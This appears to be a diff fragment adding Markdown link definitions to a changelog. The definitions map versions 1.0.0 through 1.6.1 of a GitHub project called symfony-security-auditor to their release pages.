+[1.6.1]: https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.6.1
+[1.6.0]: https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.6.0
+[1.5.0]: https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.5.0
+[1.4.0]: https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.4.0
+[1.3.3]: https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.3.3
+[1.3.2]: https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.3.2
+[1.3.1]: https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.3.1
+[1.3.0]: https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.3.0
+[1.2.1]: https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.2.1
+[1.2.0]: https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.2.0
+[1.1.1]: https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.1.1
+[1.1.0]: https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.1.0
+[1.0.0]: https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.0.0
